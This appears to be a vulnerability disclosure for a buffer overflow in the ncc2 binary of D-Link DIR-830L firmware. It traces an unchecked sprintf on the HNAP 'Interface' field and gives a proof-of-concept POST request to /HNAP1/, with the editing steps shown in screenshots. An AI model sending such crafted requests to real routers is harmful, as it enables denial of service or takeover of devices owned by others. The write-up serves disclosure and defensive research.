# Summary
There is a buffer overflow vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to denial of service or potential command execution.

Fimware download link : 
https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `pure_GetInterfaceStatistics` function and `Statistics.html`.

# Details
Vulnerable code is in function `pure_GetInterfaceStatistics` of `sbin/ncc2` binary file:
![image](https://github.com/user-attachments/assets/29bf6e82-404d-4d35-97ec-647920390466)

Parameter `Interface` comes from XML form, and then use vulnerable funtion `sprintf` to concatenate string v11 to v12.

No length check for v11 leads to buffer overflow vulnerability.

Corresponding web interface is `/Statistics.html`:
![image](https://github.com/user-attachments/assets/9e1c9769-d670-4643-a413-0f63de7baa69)

![image](https://github.com/user-attachments/assets/af60b19a-722b-4648-9f0a-78afaabc585e)

Then use burpsuite to intercept the packet:
![image](https://github.com/user-attachments/assets/a9e1a548-ea62-4462-8706-d869105ac683)

Edit the value of `Interface`:
![image](https://github.com/user-attachments/assets/56670f1b-6c4c-4e99-8e39-9bda4836890c)

Then forward:
![image](https://github.com/user-attachments/assets/5115c0ce-b77e-4529-9800-c06b572658fe)
![image](https://github.com/user-attachments/assets/013fcced-b39c-44fc-9e3a-dc1432bf4aa2)
![image](https://github.com/user-attachments/assets/7d8d2fbe-f2ad-4130-bd5b-f1d6cbda7a6f)


# PoC
**Login** first, then visit `Statistics.html`, use burpsuite to intercept and edit the value of `Interface`:
```html
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/GetMultipleHNAPs"

HNAP_AUTH: B8E3B7803119AFD257BC04BF76B768DE 1729833199

Content-Length: 597

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/Statistics.html

Cookie: uid=HIVZV0Zk1C



<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetMultipleHNAPs>
<GetInterfaceStatistics><Interface></Interface></GetInterfaceStatistics><GetInterfaceStatistics><Interface>LAN</Interface></GetInterfaceStatistics><GetInterfaceStatistics><Interface>WLAN2.4G</Interface></GetInterfaceStatistics><GetInterfaceStatistics><Interface>WLAN5G</Interface></GetInterfaceStatistics></GetMultipleHNAPs>
</soap:Body>
</soap:Envelope>
```

![image](https://github.com/user-attachments/assets/013fcced-b39c-44fc-9e3a-dc1432bf4aa2)
![image](https://github.com/user-attachments/assets/7d8d2fbe-f2ad-4130-bd5b-f1d6cbda7a6f)
